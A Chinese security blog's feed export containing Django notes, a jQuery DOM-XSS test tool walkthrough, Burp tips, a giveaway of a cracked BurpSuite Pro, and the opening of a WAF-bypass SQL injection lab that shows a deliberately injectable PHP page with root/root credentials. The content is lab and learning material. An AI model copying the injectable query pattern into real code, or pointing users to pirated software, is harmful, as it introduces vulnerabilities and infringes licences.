punctuation">.</span>site<span class="token punctuation">.</span>register<span class="token punctuation">(</span>BookInfo<span class="token punctuation">)</span>admin<span class="token punctuation">.</span>site<span class="token punctuation">.</span>register<span class="token punctuation">(</span>PeopleInfo<span class="token punctuation">,</span> PeopleInfoAdmin<span class="token punctuation">)</span><span class="token comment">#注意此处添加PeopleInfoAdmin以注册</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再来刷新一下页面，就舒服很多了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/8django_note.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考链接：</p><p><a href="https://youtu.be/BXyGr9JQVcc">https://youtu.be/BXyGr9JQVcc</a></p><p><a href="https://www.cnblogs.com/Demon-Mx/p/8385318.html">https://www.cnblogs.com/Demon-Mx/p/8385318.html</a></p><p><a href="https://blog.csdn.net/qq_35965090/article/details/81663941">https://blog.csdn.net/qq_35965090/article/details/81663941</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Python </tag>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Django 学习笔记】1、基础概念和MVT架构</title>
      <link href="//200229-220746.html"/>
      <url>//200229-220746.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-Django-简介"><a href="#0x00-Django-简介" class="headerlink" title="0x00 Django 简介"></a>0x00 Django 简介</h1><ul><li>Django是Python写的开源Web开发框架，主要目的是做一个简便、快速的开发数据库驱动的网站</li><li>Django遵循MVC设计模式，在Django中有个专有名词，叫做MVT<ul><li>设计模式就是前辈们在开发过程中总结出来的经验和套路</li><li>MVC是一种设计模式，在这种设计模式下衍生出了MVT</li></ul></li><li>Django中文说明文档：<a href="https://yiyibooks.cn/xx/django_182/index.html">https://yiyibooks.cn/xx/django_182/index.html</a></li></ul><a id="more"></a><h1 id="0x01-MVC-简介"><a href="#0x01-MVC-简介" class="headerlink" title="0x01 MVC 简介"></a>0x01 MVC 简介</h1><ul><li><p>全拼：<code>Model View Controller</code></p></li><li><p>MVC 核心思想：<strong>解耦</strong></p><ul><li>让不同的模块之间降低耦合, 增强代码的可扩展性和可移植性, 实现更好的向后续版本的兼容</li><li>开发原则 : <strong>高内聚, 低耦合</strong></li></ul></li><li><p>MVC 解析</p><ul><li><p><code>M</code>全拼为<code>Model</code>, 主要封装对数据库层的访问, 内嵌ORM框架, 实现面向对象的编程来操作数据库.</p></li><li><p><code>V</code>全拼为<code>View</code>, 用于封装结果, 内嵌了模板引擎, 实现动态展示数据.</p></li><li><p><code>C</code>全拼为<code>Controller</code>, 用于接收GET或POST请求, 处理业务逻辑, 与Model和View交互, 返回结果.</p></li></ul></li></ul><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/1django_note.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x02-MVT-简介"><a href="#0x02-MVT-简介" class="headerlink" title="0x02 MVT 简介"></a>0x02 MVT 简介</h1><ul><li>MVT全拼为<code>Model-View-Template</code></li><li>MVT核心思想： <strong>解耦</strong>（按照模块间的职能进行划分，然后做解耦）</li><li>MVT解析<ul><li><code>M (模型)</code>全拼为<code>Model</code>, 与MVC中的M功能相同, 负责数据处理, 内嵌了ORM框架.</li><li><code>V (视图)</code>全拼为<code>View</code>, 与MVC中的C功能相同, 接收HttpRequest, 业务处理，返回HttpResponse.</li><li><code>T (模板)</code>全拼为<code>Template</code>, 与MVC中的V功能相同, 负责封装构造要返回的html, 内嵌了模板引擎.</li></ul></li><li>MVT 和 MVC 差异就在于黑箭头标识出来的部分.</li></ul><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2django_note.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><strong>学习 Django, 重点就是研究 <code>Model-View-Template</code> 三个模块间如何协同工作及各自模块的代码如何编写。</strong></p><h1 id="0x03-Django安装及项目创建"><a href="#0x03-Django安装及项目创建" class="headerlink" title="0x03 Django安装及项目创建"></a>0x03 Django安装及项目创建</h1><h2 id="1、安装Django"><a href="#1、安装Django" class="headerlink" title="1、安装Django"></a>1、安装Django</h2><pre class="line-numbers language-none"><code class="language-none">pip install django<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、创建Django项目"><a href="#2、创建Django项目" class="headerlink" title="2、创建Django项目"></a>2、创建Django项目</h2><p>以书籍管理系统为例，这里创建的项目名为”book”</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> django-admin startproject BookManager <span class="token comment">#创建项目</span><span class="token operator">></span> <span class="token builtin class-name">cd</span> BookManagerBookManager/ <span class="token operator">></span> python3 manage.py startapp Book <span class="token comment">#创建应用</span>BookManager/ <span class="token operator">></span> tree<span class="token builtin class-name">.</span>├── Book│   ├── __init__.py<span class="token comment">#表示文件Book可以被当作包使用</span>│   ├── admin.py<span class="token comment">#后台的站点管理注册文件</span>│   ├── apps.py│   ├── migrations<span class="token comment">#做模型迁移</span>│   │   └── __init__.py│   ├── models.py<span class="token comment">#MVT中的M</span>│   ├── tests.py<span class="token comment">#做测试用</span>│   └── views.py<span class="token comment">#MVT中的V</span>├── BookManager│   ├── __init__.py<span class="token comment">#表示文件BookManager可以被当作包使用</span>│   ├── __pycache__│   │   ├── __init__.cpython-37.pyc│   │   └── settings.cpython-37.pyc│   ├── asgi.py│   ├── settings.py<span class="token comment">#项目的整体配置文件</span>│   ├── urls.py<span class="token comment">#项目的URL配置文件</span>│   └── wsgi.py<span class="token comment">#项目与WSGI兼容的Web服务器入口</span>└── manage.py<span class="token comment">#项目运行的入口, 指定配置文件路径</span><span class="token number">4</span> directories, <span class="token number">15</span> files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建之后，使用PyChram打开，在<code>setting.py</code>的第39行下方添加<code>&#39;Book&#39;,</code>即将INSTALLED_APPS修改成如下所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">INSTALLED_APPS <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'django.contrib.admin'</span><span class="token punctuation">,</span>    <span class="token string">'django.contrib.auth'</span><span class="token punctuation">,</span>    <span class="token string">'django.contrib.contenttypes'</span><span class="token punctuation">,</span>    <span class="token string">'django.contrib.sessions'</span><span class="token punctuation">,</span>    <span class="token string">'django.contrib.messages'</span><span class="token punctuation">,</span>    <span class="token string">'django.contrib.staticfiles'</span><span class="token punctuation">,</span>    <span class="token string">'Book'</span><span class="token punctuation">,</span><span class="token comment">#添加此行以安装应用</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、运行项目"><a href="#3、运行项目" class="headerlink" title="3、运行项目"></a>3、运行项目</h2><p>在项目目录下，执行<code>python3 manage.py runserver</code>即可运行</p><pre class="line-numbers language-none"><code class="language-none">python3 manage.py runserver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">BookManager/ <span class="token operator">></span> python3 manage.py runserverWatching <span class="token keyword">for</span> <span class="token function">file</span> changes with StatReloaderPerforming system checks<span class="token punctuation">..</span>.System check identified no issues <span class="token punctuation">(</span><span class="token number">0</span> silenced<span class="token punctuation">)</span>.You have <span class="token number">17</span> unapplied migration<span class="token punctuation">(</span>s<span class="token punctuation">)</span>. Your project may not work properly <span class="token keyword">until</span> you apply the migrations <span class="token keyword">for</span> app<span class="token punctuation">(</span>s<span class="token punctuation">)</span>: admin, auth, contenttypes, sessions.Run <span class="token string">'python manage.py migrate'</span> to apply them.February <span class="token number">28</span>, <span class="token number">2020</span> - <span class="token number">19</span>:08:25Django version <span class="token number">3.0</span>.3, using settings <span class="token string">'BookManager.settings'</span>Starting development server at http://127.0.0.1:8000/Quit the server with CTRL-BREAK.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，浏览器访问<code>http://127.0.0.1:8000/</code>，出现以下界面，说明项目已经成功创建了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/3django_note.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考链接：</p><p><a href="https://youtu.be/BXyGr9JQVcc">https://youtu.be/BXyGr9JQVcc</a></p><p><a href="https://www.cnblogs.com/Demon-Mx/p/8385318.html">https://www.cnblogs.com/Demon-Mx/p/8385318.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Python </tag>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【工具分享】分享一个jQuery多版本XSS漏洞检测工具</title>
      <link href="//200223-231648.html"/>
      <url>//200223-231648.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近在搞一个 jQuery v2.1.4 DOM-XSS 漏洞的复现，在网上找了很多Payload都不能用，大多数Payload都只适用于 jQuery v1.x 版本的。</p><p>后来看到有个文章说需要Safari浏览器，于是又废了半天劲装了个黑苹果（当时不知道原来Safari浏览器还有Windows版），用Safari浏览器一番折腾依旧没有复现，直到后来在GitHub上找到了这个检测工具，分享出来，避免踩坑。</p><a id="more"></a><h1 id="0x01-工具使用"><a href="#0x01-工具使用" class="headerlink" title="0x01 工具使用"></a>0x01 工具使用</h1><blockquote><p>下载地址：<a href="https://github.com/mahp/jQuery-with-XSS">https://github.com/mahp/jQuery-with-XSS</a></p></blockquote><p>1、下载之后，解压，使用编辑器打开，修改第9行代码，将代码中 src 后的链接修改为自己要验证的js地址链接。</p><pre class="line-numbers language-none"><code class="language-none">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;http:&#x2F;&#x2F;yourjquerylink&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、保存之后，使用浏览器打开，然后可以看到3个Demo.</p><pre class="line-numbers language-none"><code class="language-none">bug-9521bug-11290bug-11974<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3、可以依次点击这三个Demo，看看哪个会弹窗，我这里是 jQuery v2.1.4 的版本，在点击 bug-11974 发生了弹窗，说明此版本的漏洞被验证成功了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/1Snipaste_2020-02-23_23-05-36.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>4、也可以点击页面中的 test version，来判断自己版本的  jQuery 版本存在的 bug 编号，例如我这里的  jQuery v2.1.4 版本就对应着 bug-2432和bug-11974。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2Snipaste_2020-02-23_23-09-03.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>5、知道 bug 编号之后，再来到 test.html 页面点击对应的 bug编号即可。</p><h1 id="0x02-小结"><a href="#0x02-小结" class="headerlink" title="0x02 小结"></a>0x02 小结</h1><p>以上工具的使用方法是自己慢慢摸索出来的，如有不对的地方欢迎留言批评指正。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具分享 </tag>
            
            <tag> jQuery </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【经验总结】解决 BurpSuite Pro v2020.1 版本中文乱码问题</title>
      <link href="//200217-134445.html"/>
      <url>//200217-134445.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>之前在我的公众号分享了 BurpSuite Pro v2020.1 版本，但是在使用过程中发现总是会有中文乱码的情况出现，后来使用 Lucida 字体，乱码的情况得到了缓解，但是有些网页依旧会出现乱码的情况，直到后来才意识到问题其实不在于字体的选择。</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/1Snipaste_2020-02-17_13-34-32.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2Snipaste_2020-02-17_13-37-02.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x01-解决办法"><a href="#0x01-解决办法" class="headerlink" title="0x01 解决办法"></a>0x01 解决办法</h1><p>来到 User Options –&gt; Display –&gt; Character Sets，在第四个选项中选择 UTF-8，中文乱码的问题就可以得到解决，这个时候不管我字体选择的是哪一个，中文都是显示正常的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/3Snipaste_2020-02-17_13-38-35.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/4Snipaste_2020-02-17_13-39-09.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h1><p>在网上找了很多解决办法，但是大部分文章都是说更改中文字体就能解决，但是我这个版本没有中文字体，所以那些文章里的办法都不能用，最后才意识到通过修改编码就能解决。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BurpSuite </tag>
            
            <tag> 软件 </tag>
            
            <tag> 经验总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【工具分享】BurpSuite Pro v2020.1 无后门专业破解版</title>
      <link href="//200211-135752.html"/>
      <url>//200211-135752.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>工欲善其身，必先利其器，吃饭的家伙终于更新了，这次改动还蛮大的，尤其是加入了黑暗模式。</p><p>至于工具的使用及破解方法相信你既然能看到这篇文章，那就不用我过多赘述了 [手动狗头]。</p><a id="more"></a><h1 id="新功能"><a href="#新功能" class="headerlink" title="新功能"></a>新功能</h1><p>1、HTTP消息编辑器下JavaScript、JSON、CSS的语法高亮颜色</p><p>2、添加了行号，代码折叠功能</p><p>3、漏洞扫描检测、规则有巨大提升</p><p>4、增加黑暗主题</p><p>5、新增特殊功能、性能改进…</p><h1 id="获取方式"><a href="#获取方式" class="headerlink" title="获取方式"></a>获取方式</h1><p>在我的公众号（TeamsSix）回复 “ Burp “ 即可获取下载地址。</p><h1 id="新版效果"><a href="#新版效果" class="headerlink" title="新版效果"></a>新版效果</h1><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/burp20201_1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/burp20201_3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/burp20201_2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BurpSuite </tag>
            
            <tag> 工具分享 </tag>
            
            <tag> 软件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【摘要】漏洞组合拳之XSS+CSRF记录</title>
      <link href="//200206-202959.html"/>
      <url>//200206-202959.html</url>
      
        <content type="html"><![CDATA[<p>前几天，我在FreeBuf发布了一篇文章《漏洞组合拳之XSS+CSRF记录》，因为版权原因，无法在​这里发布。</p><p>文章里介绍了两种常见的组合拳方法，感兴趣的可以点击下方链接进行查看。</p><p>文章链接：<a href="https://www.freebuf.com/vuls/225096.html">https://www.freebuf.com/vuls/225096.html</a></p><a id="more"></a><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>本文原文地址：<a href="https://www.teamssix.com/year/200206-202959.html">https://www.teamssix.com/year/200206-202959.html</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 摘要 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> CSRF </tag>
            
            <tag> 组合拳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【经验总结】Python3 Requests 模块请求内容包含中文报错的解决办法</title>
      <link href="//200206-202951.html"/>
      <url>//200206-202951.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近在写一个爬虫代码，里面需要使用 get 传参中文，但是如果直接使用中文而不对其编码的话，程序将会报错。</p><pre class="line-numbers language-none"><code class="language-none">UnicodeEncodeError: &#39;latin-1&#39; codec can&#39;t encode characters in position 38-39: ordinal not in range(256)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><a id="more"></a><h1 id="0x01-网上的一些解决办法"><a href="#0x01-网上的一些解决办法" class="headerlink" title="0x01 网上的一些解决办法"></a>0x01 网上的一些解决办法</h1><p>参考网上的解决办法，比如下面的几种办法。</p><pre class="line-numbers language-none"><code class="language-none">1、在中文后加上&quot;.encode(&#39;GBK&#39;)&quot;2、在文件头部加上&quot;＃coding &#x3D; utf-8&quot;3、在中文后加上&quot;.encode(&#39;utf-8&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这几种方法在我这里都行不通，抓包也可以看到数据包里的中文并不是我们想象的经过 URL 编码的字符。</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;test&#x3D;b&#39;%5Cxe6%5Cxb5%5Cx8b%5Cxe8%5Cxaf%5Cx95&#39; HTTP&#x2F;1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x02-可行的办法"><a href="#0x02-可行的办法" class="headerlink" title="0x02 可行的办法"></a>0x02 可行的办法</h1><p>最后才意识到，其实并不需要对中文进行 GBK、UTF-8 转码，而应该对其进行 URL 编码。</p><pre class="line-numbers language-none"><code class="language-none">from urllib.parse import quotetext &#x3D; quote(&quot;测试&quot;, &#39;utf-8&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>利用 quote 函数对 “测试” 进行 URL 编码后，再次抓包可以看到中文部分已经是 URL 格式了。</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;test&#x3D;%E6%B5%8B%E8%AF%95 HTTP&#x2F;1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时，程序也不再报错，可以顺利执行了。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>本文原文地址：<a href="https://www.teamssix.com/year/200206-202951.html">https://www.teamssix.com/year/200206-202951.html</a><br>参考文章：<a href="https://blog.csdn.net/qq_33876553/article/details/79730246">https://blog.csdn.net/qq_33876553/article/details/79730246</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 经验总结 </tag>
            
            <tag> Python3 </tag>
            
            <tag> 解决办法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【经验总结】SQL注入Bypass安全狗360主机卫士</title>
      <link href="//200105-211642.html"/>
      <url>//200105-211642.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这类的文章已经是比较多了，本文也主要是作为学习笔记来记录，主要是记录一下我在学习 SQL 注入 Bypass 的过程，同时前人的不少绕过方法已经失效了，所以这里也是记录一下最新规则的一些绕过方法。</p><h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h1><p>测试环境：Win7 + Apache + MySQL 5.7.26 + PHP 5.5.45</p><a id="more"></a><p>测试代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"dvwa"</span><span class="token punctuation">,</span> <span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name,last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>'; "</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;pre>'</span><span class="token operator">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/pre>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&amp;nbsp"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">;</span><span class="token function">mysql_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的测试代码是参考安全客上的一篇文章，不过为了方便测试在原代码的基础上加入了 POST 传参功能，代码来自本文参考文章第 2 篇。</p><p>为方便接下来的测试，需要本地先安装 dvwa ，至于代码中其他的参数，比如数据库地址、用户名、密码什么的自行根据自己本地配置情况修改即可。</p><p>如果这个代码在使用的过程中，只使用 POST 方法传参的话，页面是会输出错误信息的，如果不想让它输出错误信息，可以在 php.ini 文件中修改 display_errors 为 Off ，然后重启 Apache 即可。</p><p>访问本地搭建的靶场地址，像下面这个样子就算是搭建成功了，其中 192.168.38.132​ 需要修改为你自己的靶机 IP 地址。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.38.132&#x2F;sql.php?id&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x02-安全狗"><a href="#0x02-安全狗" class="headerlink" title="0x02 安全狗"></a>0x02 安全狗</h1><h2 id="1、搭建"><a href="#1、搭建" class="headerlink" title="1、搭建"></a>1、搭建</h2><p>下载地址：<a href="http://free.safedog.cn/website_safedog.html">http://free.safedog.cn/website_safedog.html</a></p><p>我下载的是 Windows Apache V4.0 的版本，2019-11-27 更新的规则。</p><p>在安装安全狗的时候，如果不知道服务名填什么，可以查看本文参考文章第 5 篇。</p><p>如果使用 phpstudy 8.0 及更高版本可能在系统服务中找不到 apache 的服务名，所以这时建议使用 8.0 以下版本，比如 phpstudy 2018，之后再设置运行模式为“系统服务”即可，不要问我怎么知道的 [狗头]</p><p>搭建好后，我们构造 SQL 注入语句判断注入点，访问目标网站，网站有安全狗的提示，说明就搭建好了。</p><pre class="line-numbers language-none"><code 